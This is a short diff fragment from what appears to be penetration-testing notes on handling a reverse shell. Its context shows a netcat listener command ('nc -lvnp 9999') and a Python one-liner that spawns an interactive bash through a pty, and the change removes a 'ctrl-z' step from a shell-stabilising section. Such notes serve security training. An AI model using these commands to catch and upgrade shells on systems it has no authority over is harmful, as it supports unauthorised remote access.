@@ -63,7 +63,6 @@ nc -lvnp 9999
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 # Establish stable bash using STTY
-ctrl-z
 
 ```
 
